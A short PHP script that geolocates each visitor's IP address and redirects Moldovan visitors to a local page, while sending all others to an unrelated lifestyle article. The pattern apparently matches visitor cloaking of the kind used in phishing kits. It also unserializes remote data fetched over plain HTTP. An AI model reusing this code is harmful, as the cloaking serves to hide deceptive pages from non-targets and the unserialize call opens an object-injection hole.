<?php
$a = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$countrycode= $a['geoplugin_countryCode'];
if ($countrycode=='MD')
    header( 'Location: index6c31.html' ) ;
else 
    header( 'Location: https://www.stayathomemama.de/my-lifestyle/6-foods-to-give-your-mans-libido-a-lift/' ) ;

?>